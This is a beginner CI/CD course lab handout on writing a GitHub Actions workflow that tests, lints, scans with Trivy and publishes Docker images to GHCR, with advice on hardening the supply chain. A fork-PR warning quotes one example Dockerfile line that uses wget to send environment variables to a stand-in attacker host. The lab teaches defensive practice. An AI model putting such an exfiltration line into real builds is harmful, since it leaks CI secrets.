# Lab 3 — Continuous Integration with GitHub Actions

![difficulty](https://img.shields.io/badge/difficulty-beginner-success)
![topic](https://img.shields.io/badge/topic-CI/CD-blue)
![points](https://img.shields.io/badge/points-10%2B2-orange)
![tech](https://img.shields.io/badge/tech-GitHub%20Actions-informational)

> **Goal:** Put a pipeline behind the Lab 1/2 service. Every push: test → lint → scan → build → publish, on a clean runner, automatically.
> **Deliverable:** A PR from `lab03` adding `.github/workflows/python-ci.yml`, `app_python/tests/`, `requirements-dev.txt`, branch protection, and `app_python/docs/LAB03.md`.

---

## Overview

A green check on your laptop proves nothing. CI runs the *same* steps on the *same* runner for *every* commit, so "works on my machine" stops being a defence. The skill this lab assesses is **writing the GitHub Actions workflow by hand** — not filling in the last word of someone else's YAML.

In this lab you practice:
- Writing pytest tests against the Lab 1 endpoints (real assertions, not import smoke tests)
- Composing a GitHub Actions workflow file *from the keys up* — `name`, `on`, `permissions`, `concurrency`, `jobs`, `steps`
- Publishing Docker images to GHCR using `GITHUB_TOKEN` (no PAT, nothing to rotate)
- Gating merges on a Trivy filesystem scan
- Speeding CI up with `setup-python`'s pip cache and BuildKit's GHA layer cache

> ⚠️ **Scope:** No deploy step. CI publishes the image — the cluster pulls it in Lab 9+. Don't build a deploy-on-merge here; you'd be re-doing it with ArgoCD in Lab 13 anyway.

---

## Project State

**You should have from previous labs:**
- `app_python/` from Lab 1 — Flask/FastAPI service with `/` and `/health`
- `app_python/Dockerfile` from Lab 2 — multi-stage, non-root, builds clean locally
- `app_python/requirements.txt` — pinned dependencies

**This lab adds:**
- `app_python/requirements-dev.txt` — pytest, pytest-cov, ruff
- `app_python/tests/test_app.py` — real assertions on `/`, `/health`, an error path
- `.github/workflows/python-ci.yml` — the pipeline (test → scan → build → push)
- Branch protection on `main` requiring those checks
- `app_python/docs/LAB03.md` — your submission report

By Lab 13 this pipeline's GHCR image is what ArgoCD watches. The tagging strategy you pick this week is the one your future deploys will rely on.

---

## Setup

```bash
python --version            # 3.12+; the matrix tests 3.12 and 3.13
docker version              # 29.x; same as Lab 2
trivy --version             # v0.69.3 or later — NEVER v0.69.4 (see below)

# Local test of the workflow without pushing to GitHub:
brew install act           # macOS
# Linux: see https://github.com/nektos/act#installation
act --version              # 0.2.88+
```

You'll commit only these new paths:

```
.github/
└── workflows/
    └── python-ci.yml                  # the workflow you write
app_python/
├── requirements-dev.txt
├── tests/
│   └── test_app.py
└── docs/
    └── LAB03.md
```

---

## ⚠️ A Note on Supply-Chain Safety (read before Task 2)

CI runs third-party code with access to your repository's secrets — the actions you pin **are** your attack surface. Two recent incidents define the rules:

- **`tj-actions/changed-files` (CVE-2025-30066, March 14–15 2025)** — a compromised release leaked secrets from CI logs in **23,000+ repositories**. Every repo pinned to `@main` or a floating tag pulled the malicious code automatically. Fixed in `v46.0.1`.
- **Trivy (CVE-2026-33634, March 19 2026)** — a malicious **`v0.69.4`** binary was published to the official GitHub release page after a maintainer signing key was compromised. **Use `v0.69.3` or a later patched release — NEVER `v0.69.4`.** The Action wrapper (`aquasecurity/trivy-action@v0.35.0`+) and `setup-trivy@v0.2.6`+ are post-incident-safe.

**What you do about it in this lab:**
- Pin the runner OS: `runs-on: ubuntu-24.04`, not `ubuntu-latest`.
- Pin actions to a major tag: `actions/checkout@v4`. For high-risk or third-party actions, pin to a **full commit SHA** — a tag can be re-pointed by an attacker; a SHA cannot.
- Scope `permissions:` to the minimum each job needs (`contents: read` by default; `packages: write` only on the job that pushes to GHCR).
- Never push images from PRs **from forks** — a fork can rewrite the Dockerfile and use your `GITHUB_TOKEN` to publish a malicious image to your namespace.

> 📌 Example SHA-pin (the comment keeps it readable):
> ```yaml
> - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
> ```

---

## Task 1 — Unit Tests with pytest (2 pts)

### 1.1 — Pick a runner and justify it

Use **pytest 8.3+**. Fixtures + plain `assert` beat `unittest`'s boilerplate for most projects, and `pytest-cov` is one line to wire in for the bonus. In `docs/LAB03.md` give one paragraph on why pytest over `unittest`.

### 1.2 — Write `requirements-dev.txt`

`YOUR TASK`: create `app_python/requirements-dev.txt` with **exactly-pinned** versions of the dev tools — `pytest`, `pytest-cov`, and a linter (`ruff` recommended; `flake8` or `pylint` accepted). Use `pkg==X.Y.Z` form, not floating ranges; the lock-it-down argument from Lab 2 applies.

### 1.3 — Write tests that actually fail when the app is broken

`YOUR TASK`: create `app_python/tests/test_app.py` with at least three tests. Each must assert on **behaviour**, not just that an import succeeded:

| Test | Asserts |
|------|---------|
| `GET /` | status `200`, response is JSON, body contains the **five** keys from Lab 1 (`service`, `system`, `runtime`, `request`, `endpoints`) |
| `GET /health` | status `200`, JSON body has `status == "healthy"` |
| Unknown route | status `404`, body is JSON (not the framework's HTML default — proves your Lab 1 error handler is wired) |

Hints (no full code given — writing the tests *is* the skill):

- Flask: `app.test_client()` in a `pytest.fixture`; `r.get_json()` on the response.
- FastAPI: `from fastapi.testclient import TestClient`; `r.json()` on the response.
- **Don't** test internal helpers; test routes. A test that calls `get_uptime()` directly won't catch a routing typo.
- **Don't** assert exact uptime values — flaky. Assert the *shape* (e.g. `"uptime_seconds" in body["runtime"] and isinstance(..., int)`).

### 1.4 — Run them locally

```bash
cd app_python
python -m venv venv && source venv/bin/activate
pip install -r requirements.txt -r requirements-dev.txt
pytest -q
ruff check .
```

Both must exit `0`. If they don't, fix the app, not the tests.

### 1.5 — Proof of work

**Paste into `docs/LAB03.md`:**

- The output of `pytest -q` (real run from your machine — at least 3 dots, all passed)
- The output of `ruff check .` (or `flake8 .`) — "All checks passed!" or equivalent
- One sentence per test explaining what behaviour it locks in (this prevents "delete the test when it breaks" syndrome later)

---

## Task 2 — Test & Lint in CI (3 pts)

Now wire the tests into GitHub Actions. The workflow file lives at `.github/workflows/python-ci.yml`. Tasks 2–4 all extend the **same file** — Task 2 delivers the `test` job, Task 3 adds `docker`, Task 4 wires the Trivy gate.

### 2.1 — Understand the keys before you write

A workflow has five top-level keys you will write:

| Key | What it controls | Lab 3 value |
|-----|------------------|-------------|
| `name:` | Display name in the Actions tab | freeform |
| `on:` | Triggers | `push` to `main` **and** `pull_request` |
| `permissions:` | What `GITHUB_TOKEN` can do | start `contents: read`; grant `packages: write` per-job |
| `concurrency:` | De-dup superseded runs | group by ref, `cancel-in-progress: true` |
| `jobs:` | The work | `test` (this task), `docker` (Task 3) |

### 2.2 — Write the workflow skeleton

`YOUR TASK`: create `.github/workflows/python-ci.yml` and fill in every blank. The skeleton shows the YAML **shape** — you supply the **values + step bodies**. Don't paste a workflow you found online; the grader will ask why you picked each value.

```yaml
name: ___                              # YOUR TASK: workflow display name

on:
  ___:                                 # YOUR TASK: which event? push to main? branches filter?
    branches: [___]
    paths:                             # YOUR TASK: skip CI on docs-only commits
      - ___
      - ___
  ___:                                 # YOUR TASK: the other event (pull_request)
    paths:
      - ___
      - ___

permissions:
  contents: ___                        # YOUR TASK: minimum needed for checkout

concurrency:
  group: ___                           # YOUR TASK: how do you de-dup superseded runs on the SAME ref?
  cancel-in-progress: ___              # YOUR TASK: should an older run keep going? why/why not?

jobs:
  test:
    runs-on: ___                       # YOUR TASK: which runner? why pinned (not :latest)?
    strategy:
      fail-fast: ___                   # YOUR TASK: should 3.12 dying kill 3.13? what does that hide?
      matrix:
        python-version: [___, ___]     # YOUR TASK: which versions? (Lab 1 standardised on which?)

    steps:
      - uses: actions/checkout@___     # YOUR TASK: pin to major tag (or SHA — see supply-chain note)

      - uses: actions/setup-python@___
        with:
          python-version: ___          # YOUR TASK: reference the matrix value
          cache: ___                   # YOUR TASK: which cache mode does setup-python provide?
          cache-dependency-path: ___   # YOUR TASK: which file(s) does the cache key hash?
                                       #            (you install BOTH requirements.txt + requirements-dev.txt —
                                       #             cache must invalidate on either; YAML accepts a multi-line list)

      - name: ___                      # YOUR TASK: human-readable step name
        working-directory: ___         # YOUR TASK: which dir holds requirements*.txt + tests/?
        run: |
          # YOUR TASK: install both runtime and dev requirements
          # Hint: pip install -r requirements.txt -r requirements-dev.txt

      - name: ___                      # YOUR TASK: lint step name
        working-directory: ___         # YOUR TASK: same dir as install — ruff scans the code, not the repo root
        run: ___                       # YOUR TASK: ruff/flake8/pylint command

      - name: ___                      # YOUR TASK: test step name
        working-directory: ___         # YOUR TASK: same dir — without this, pytest finds 0 tests
        run: ___                       # YOUR TASK: pytest command (quiet mode? cov?)
```

> 💡 **Why `working-directory:` on every step?** A fresh runner starts at the repo root (`$GITHUB_WORKSPACE`). Without `working-directory:`, `pytest -q` runs at the repo root and reports **`collected 0 items`** — a green-but-meaningless run. Set the dir on each step that touches the app (or set it once at the job level via `defaults.run.working-directory`).

### 2.3 — Add a status badge

`YOUR TASK`: once the workflow runs once on your fork, GitHub generates a badge URL of the form `https://github.com/<user>/<repo>/actions/workflows/python-ci.yml/badge.svg`. Add it to `app_python/README.md` at the top as a markdown image with a link back to the Actions tab — e.g.

```md
[![Python CI](https://github.com/<user>/<repo>/actions/workflows/python-ci.yml/badge.svg)](https://github.com/<user>/<repo>/actions/workflows/python-ci.yml)
```

### 2.4 — Validate locally with `act` before pushing

Saves you minutes of CI debugging:

```bash
act -l                                                                       # list jobs
act push -j test --matrix python-version:3.13 -P ubuntu-24.04=catthehacker/ubuntu:act-24.04
```

If `act` fails, your workflow is broken — fix it before pushing.

### 2.5 — Proof of work

**Paste into `docs/LAB03.md`:**

- Link to a green workflow run on your fork (or `act` output if you can't get CI on the fork yet)
- The full workflow file (or a permalink to it in your repo)
- One paragraph: why your trigger filter (`paths:`) is what it is — what changes *should* fire CI, and what shouldn't?
- One number: warm-cache install time vs cold-cache install time (look at the "Set up Python" step duration on a second run vs the first)

---

## Task 3 — Build & Publish to GHCR (3 pts)

Lab 2 pushed images by hand. CI does it for you: a `docker` job that builds the Lab 2 image and pushes it to GitHub Container Registry, authenticated with the auto-provisioned `GITHUB_TOKEN`. **No PAT. Nothing to rotate.**

### 3.1 — Pick your tagging strategy

`YOUR TASK`: before writing YAML, decide:

- **SemVer** (`v1.4.2`, driven by `git tag`) — for libraries or services with external consumers who pin you.
- **CalVer** (`2026.05.28`) — for services nobody else pins, where "breaking change" doesn't really apply.
- **SHA-only** (`git-a3f1b2c`) — every commit gets an immutable tag. Mandatory regardless of the above; this is what reproducible deploys reference.

Whatever you pick, **`:latest` is a convenience pointer, not a release.** Never deploy `:latest` to anything that matters.

In `docs/LAB03.md`, justify your choice in 2–3 sentences.

### 3.2 — Write the docker job

`YOUR TASK`: append the `docker` job to `python-ci.yml`. Same skeleton-with-blanks rules — you write the values and the step bodies.

```yaml
  docker:
    needs: ___                         # YOUR TASK: which job must pass first? Why?
    runs-on: ___                       # YOUR TASK: same runner as test? why same/different?
    if: ___                            # YOUR TASK: gate on event_name — DON'T push from PRs (esp. fork PRs)
    permissions:
      contents: ___                    # YOUR TASK
      packages: ___                    # YOUR TASK: what does GHCR push need?

    steps:
      - uses: actions/checkout@___

      - uses: docker/login-action@___  # YOUR TASK: pin
        with:
          registry: ___                # YOUR TASK: which registry host?
          username: ___                # YOUR TASK: which github context value?
          password: ___                # YOUR TASK: ephemeral token expression — NOT a PAT

      - uses: docker/metadata-action@___
        id: meta
        with:
          images: ___                  # YOUR TASK: ghcr.io/<owner>/<image-name>
                                       # Tip: `ghcr.io/${{ github.repository }}` gives `ghcr.io/<owner>/<repo>`,
                                       # which is fine. If you want the image name to match the `devops-info-service`
                                       # tag you pushed by hand in Lab 2 (so Lab 9's Deployment can pin one name),
                                       # use `ghcr.io/${{ github.repository_owner }}/devops-info-service` instead.
          tags: |
            # YOUR TASK: at least TWO tag patterns.
            # Pick from: type=sha,prefix=git-  |  type=semver,pattern={{version}}
            #            type=raw,value=latest,enable={{is_default_branch}}
            #            type=schedule,pattern={{date 'YYYY.MM.DD'}}
            ___
            ___

      - uses: docker/build-push-action@___
        with:
          context: ___                 # YOUR TASK: which dir holds the Dockerfile?
          push: ___                    # YOUR TASK: hardcode true, or use github.event_name? (see §3.3)
          tags: ___                    # YOUR TASK: feed in metadata-action output
          labels: ___                  # YOUR TASK: feed in metadata-action output (OCI labels)
          cache-from: ___              # YOUR TASK: which GHA cache mode?
          cache-to: ___                # YOUR TASK: which GHA cache mode + mode=max?
```

### 3.3 — Don't push from fork PRs

`YOUR TASK`: the `if:` on the docker job (or the `push:` arg on `build-push-action`) must prevent pushing when the PR comes from a fork. A fork PR can swap your Dockerfile for `FROM busybox; CMD wget evil.example.com/$(env)` and use your `GITHUB_TOKEN` to publish it under your namespace.

Hint: `github.event_name != 'pull_request'` covers the common case; for stricter setups, gate on `github.event.pull_request.head.repo.fork == false`.

### 3.4 — Proof of work

**Paste into `docs/LAB03.md`:**

- Link to the green `docker` job run (Actions tab)
- Screenshot or URL of the package under **your repo → Packages** (`ghcr.io/<owner>/<repo>:<your-tag>`)
- The list of tags your run produced (copy from the metadata-action step's logs)
- 2–3 sentences justifying SemVer vs CalVer for this service

---

## Task 4 — Trivy Vulnerability Gate (2 pts)

A scan that only warns gets ignored. Make Trivy a **gate**: a HIGH/CRITICAL finding fails the job and blocks the merge.

### 4.1 — Wire Trivy into the test job

`YOUR TASK`: add a Trivy step *inside* the `test` job (or a dedicated `scan` job that `docker` `needs:`). It must run **before** the docker job — a vulnerable dep cannot make it into a published image.

> 💡 **Matrix vs scan:** if you add Trivy inside the matrixed `test` job, it runs twice (once per Python version) — wasteful but harmless. To run it once, either gate it with `if: matrix.python-version == '3.13'` or factor it into a separate `scan` job that the `docker` job `needs:`.
>
> 🌐 **DB mirror on restricted networks:** if your runner can't reach `ghcr.io/aquasecurity/trivy-db`, set `TRIVY_DB_REPOSITORY: public.ecr.aws/aquasecurity/trivy-db:2` in the step's `env:` — Aqua publishes an anonymous mirror there (see Lab 2's note).

```yaml
      - name: ___                                  # YOUR TASK: descriptive step name
        uses: aquasecurity/trivy-action@___        # YOUR TASK: version (>= 0.35.0; NEVER Trivy v0.69.4)
        with:
          scan-type: ___                           # YOUR TASK: fs or image? what do we have at this stage?
          scan-ref: ___                            # YOUR TASK: which path holds requirements.txt?
          severity: ___                            # YOUR TASK: which severities should block?
          exit-code: ___                           # YOUR TASK: what value turns this from warn into gate?
          ignore-unfixed: ___                      # YOUR TASK: skip CVEs with no patch? trade-off?
```

### 4.2 — Don't silence fixable CVEs

`YOUR TASK`: if Trivy flags a dependency, the **fix is in the PR**: bump the version in `requirements.txt`. Don't paper over it with `.trivyignore` or by raising the severity threshold. Track genuinely-unfixable findings in a GitHub issue with the CVE ID and a date.

### 4.3 — Branch protection

`YOUR TASK`: in **Settings → Branches → Branch protection rules** for `main`:

- ✅ Require a pull request before merging (≥ 1 review)
- ✅ Require status checks to pass — pick **`test`** (every matrix cell) and **`docker`**
- ✅ Require branches to be up to date before merging
- ✅ Do not allow bypassing the above (admins included)

The green CI badge is decoration; required status checks are the gate.

### 4.4 — Proof of work

**Paste into `docs/LAB03.md`:**

- The Trivy step output from a green run (illustrative if you've fixed everything — your output will say `0` findings)
- If you bumped a dep, show the before/after `requirements.txt` diff
- Screenshot of your branch protection settings showing the required checks
- One sentence on each: severity threshold choice; `ignore-unfixed` trade-off

---

## Bonus Task — Path-Filtered Multi-App CI + Coverage (2 pts)

Less hand-holding here. You already know how to write a workflow.

### Bonus.1 — Second workflow for the compiled-language app (1 pt)

If you did Lab 1's bonus (Go/Rust/Java sibling), wire it up:

- New file `.github/workflows/<lang>-ci.yml` with the same shape: lint + test + (optionally) build image.
- **Both** workflows must `paths:`-filter to their own app dir so a commit touching only `app_python/` does not trigger the Go workflow, and vice versa.
- Demonstrate selective triggering: one commit in each app dir, show the Actions tab only fires the relevant workflow.

### Bonus.2 — Coverage in CI (1 pt)

- Run `pytest --cov=app_python --cov-report=xml --cov-report=term` in the `test` job.
- Upload to **Codecov** (`codecov/codecov-action@v4` — free for public repos) or **Coveralls**.
- Add a coverage badge to `app_python/README.md`.
- In `docs/LAB03.md`, state your coverage percentage and **one sentence on what's intentionally uncovered and why** (e.g. `if __name__ == "__main__":` blocks). Coverage isn't a target — Fowler again: *"useful for finding untested code; not a useful target."*

---

## How to Submit

```bash
git switch -c lab03
git add .github/workflows/python-ci.yml
git add app_python/tests/ app_python/requirements-dev.txt
git add app_python/docs/LAB03.md app_python/README.md
# bonus only:
git add .github/workflows/go-ci.yml          # if you did the language bonus
git commit -m "feat(lab03): CI pipeline — pytest, ruff, trivy gate, GHCR push"
git push -u origin lab03
```

Open **two** PRs:

- `your-fork:lab03` → `course-repo:main` *(reviewed)*
- `your-fork:lab03` → `your-fork:main` *(merges into your own main when done)*

CI runs automatically on both — that's the whole point.

PR checklist:

```text
- [ ] Task 1 — pytest 3+ tests, ruff clean, output pasted in docs/LAB03.md
- [ ] Task 2 — workflow with on/permissions/concurrency/matrix; warm-cache time documented
- [ ] Task 3 — docker job needs:test, GHCR push works, ≥ 2 tags, no push from fork PRs
- [ ] Task 4 — Trivy gate with exit-code:"1", branch protection screenshot
- [ ] Bonus — second workflow with path filters AND coverage badge (if attempted)
```

---

## Acceptance Criteria

### Task 1 (2 pts)
- ✅ `requirements-dev.txt` exact-pinned (`pytest==X.Y.Z`, not `>=`)
- ✅ Three tests asserting **behaviour** (status + body shape), one of them the 404 path
- ✅ `pytest -q` and `ruff check .` both pass locally; outputs in `docs/LAB03.md`

### Task 2 (3 pts)
- ✅ `.github/workflows/python-ci.yml` triggers on `push` to `main` and `pull_request`, with a `paths:` filter
- ✅ `concurrency` group by ref, `cancel-in-progress: true`
- ✅ Matrix over Python 3.12 + 3.13, `fail-fast: false`
- ✅ `setup-python@v5` with `cache: pip`, `cache-dependency-path:` set
- ✅ Status badge in `app_python/README.md`; link to a green run

### Task 3 (3 pts)
- ✅ `docker` job has `needs: test`
- ✅ Uses `GITHUB_TOKEN` (no PAT), `permissions: { packages: write }` scoped to the job
- ✅ `metadata-action@v5` produces ≥ 2 tags (one immutable per-commit, e.g. `git-<sha>`)
- ✅ `build-push-action@v6` with `cache-from/to: type=gha`
- ✅ Image visible under your repo → Packages
- ✅ No push from PRs (especially fork PRs)

### Task 4 (2 pts)
- ✅ `aquasecurity/trivy-action@0.35.0` or later (NOT Trivy v0.69.4)
- ✅ `severity: HIGH,CRITICAL`, `exit-code: "1"`, `ignore-unfixed: true`
- ✅ Scan blocks the docker job (in `test` or via a `scan` job + `needs:`)
- ✅ Branch protection requires `test` and `docker` checks

### Bonus (2 pts)
- ✅ Second workflow with `paths:` filter on both, selective-trigger proof
- ✅ Coverage XML generated, uploaded to Codecov/Coveralls, badge in README

---

## Rubric

| Task | Points | Criteria |
|------|-------:|----------|
| **Task 1** — Unit tests | **2** | Real assertions, 404 path covered, locally green |
| **Task 2** — Test/lint job | **3** | Matrix + pip cache + concurrency + path filter; warm-cache time recorded |
| **Task 3** — GHCR build/push | **3** | `needs: test`, `GITHUB_TOKEN`, ≥ 2 tags, no fork-PR push, image visible |
| **Task 4** — Trivy gate | **2** | `exit-code: "1"`, gates docker, branch protection on |
| **Bonus** | **2** | Path-filtered multi-app + coverage |
| **Total** | **12** | 10 main + 2 bonus |

**Grading:**
- **10/10:** all jobs green, scan genuinely gates, tests assert behaviour, docs concise with real evidence
- **8–9/10:** CI works, good tests, one minor gap (e.g. forgot to scope `permissions`)
- **6–7/10:** CI runs but Trivy is a warning, or no fork-PR guard, or thin tests
- **<6/10:** workflow doesn't run, scan absent or non-gating, tests don't assert real behaviour

**For full points:** tests catch real bugs · workflow you can defend line-by-line · `GITHUB_TOKEN` not a PAT · Trivy fails the job on HIGH/CRITICAL · branch protection actually on.

---

## Resources

<details>
<summary>📚 Documentation</summary>

- [GitHub Actions Docs](https://docs.github.com/en/actions) · [Workflow Syntax](https://docs.github.com/en/actions/using-workflows/workflow-syntax-for-github-actions)
- [Building & Testing Python](https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python)
- [Publishing to GHCR](https://docs.github.com/en/actions/publishing-packages/publishing-docker-images)
- [Security Hardening for Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [pytest 8](https://docs.pytest.org/) · [Flask testing](https://flask.palletsprojects.com/en/stable/testing/) · [FastAPI testing](https://fastapi.tiangolo.com/tutorial/testing/)
- [Trivy](https://github.com/aquasecurity/trivy) · [`trivy-action`](https://github.com/aquasecurity/trivy-action) (use ≥ v0.35.0) · [Grype](https://github.com/anchore/grype) alternative
- [SemVer](https://semver.org/) · [CalVer](https://calver.org/) · [`docker/metadata-action`](https://github.com/docker/metadata-action)
- [`act`](https://github.com/nektos/act) (run Actions locally) · [`actionlint`](https://github.com/rhysd/actionlint) · [`gh`](https://cli.github.com/) (`gh run watch`)

</details>

<details>
<summary>⚠️ Common Pitfalls (from real dry-runs)</summary>

- **`@main` / floating tag pins** — `actions/checkout@main` lets an upstream compromise silently land in your CI. The `tj-actions/changed-files` 2025 attack (CVE-2025-30066) hit 23,000+ repos exactly this way. Pin to a major tag (`@v4`); for high-risk third-party actions, pin to a **full commit SHA** with a `# vX.Y.Z` comment.
- **`permissions:` not set → write-all default on older repos** — repos created before Feb 2023 default the workflow token to **read/write everything**. Always declare `permissions: { contents: read }` at the top and grant `packages: write` only on the job that needs it. Verify under **Settings → Actions → General → Workflow permissions** that "Read repository contents and packages permissions" is the default.
- **Pushing images from fork PRs** — a fork can rewrite the Dockerfile to exfiltrate secrets via `RUN` commands and use your `GITHUB_TOKEN` to publish a tainted image to your GHCR namespace. Gate the docker job on `if: github.event_name != 'pull_request'` (or stricter: `github.event.pull_request.head.repo.fork == false`).
- **`trivy-action` floating + Trivy v0.69.4** — pinning `trivy-action@master` or installing Trivy via `curl ... install.sh` between March 19–20 2026 executed attacker code on the runner (CVE-2026-33634). Use `aquasecurity/trivy-action@0.35.0+` and pin Trivy to **v0.69.3** or a later patched build.
- **Trivy DB download failures on restricted networks** — if your runner can't reach `ghcr.io/aquasecurity/trivy-db`, the scan dies with `failed to download vulnerability DB`. Solutions: pre-pull the DB into a private mirror and set `TRIVY_DB_REPOSITORY=<your-mirror>`, or schedule a daily warm-up workflow that runs Trivy once on `main`.
- **Matrix `fail-fast: true` hides regressions** — leaving the default `true` kills 3.13 the moment 3.12 fails. You then "fix" 3.12 without ever seeing what 3.13 was about to fail on. Always set `fail-fast: false` on a version matrix.
- **Cache hits never invalidate** — if you point `cache-dependency-path:` at the wrong file (e.g. `requirements.txt` but you only updated `requirements-dev.txt`), the cache hashes don't change and you reinstall the old versions for the next month. Use the file your install command actually consumes, or list both.
- **Tests pass but `app.py` doesn't import** — pytest happily collects zero tests if your test file has a `SyntaxError` and tells you `0 passed`. Use `pytest -q --strict-markers` and watch for the "collected 0 items" warning, or assert `len(tests) >= 3` in a meta-test.
- **`pytest -q` reports `0 passed` because Flask's auto-reload swallowed the import error** — disable `FLASK_DEBUG` in the test fixture: `app.config["TESTING"] = True; app.config["DEBUG"] = False`.
- **`ubuntu-latest` rotated under you** — Microsoft swaps the `latest` alias on its own schedule. A workflow that "worked yesterday" suddenly fails because `python3.10` is gone or `apt-get` returns 404. Pin to `ubuntu-24.04`.
- **`docker/metadata-action` with only `type=raw,value=latest`** — pushes one mutable tag and nothing immutable. Always combine `latest` with `type=sha,prefix=git-` (or `type=semver`) so every build is traceable.

</details>

<details>
<summary>🛠️ Tools worth knowing</summary>

- [`act`](https://github.com/nektos/act) — runs your workflow in a local container; faster feedback than push-and-pray
- [`actionlint`](https://github.com/rhysd/actionlint) — lints workflow YAML; catches `runs-on: ubunto-24.04` typos before CI does
- [`gh run watch`](https://cli.github.com/manual/gh_run_watch) — live-tail a running workflow from the terminal
- [`gh workflow run`](https://cli.github.com/manual/gh_workflow_run) — trigger a `workflow_dispatch` run from your shell
- [Dependabot](https://docs.github.com/en/code-security/dependabot) — auto-PRs to keep `actions/checkout@v4` and `pytest` fresh; one `.github/dependabot.yml`, no token, no third party

</details>

---

## Looking Ahead

| Lab | What CI does for it |
|---:|---|
| 4 | `terraform plan` becomes a CI gate — same idea as `pytest` |
| 5–6 | `ansible-playbook --check` in CI; idempotency proven on every PR |
| 7–8 | Integration tests once Loki + Prometheus land |
| 9–10 | CI validates K8s manifests / Helm charts (`helm lint`, `kubeval`) |
| 13 | ArgoCD watches the GHCR image **this** pipeline publishes — GitOps loop closes |
| Every future lab | this workflow is your safety net |

> **Remember:** a good pipeline is fast, deterministic, and boring. Excitement in CI is a smell.
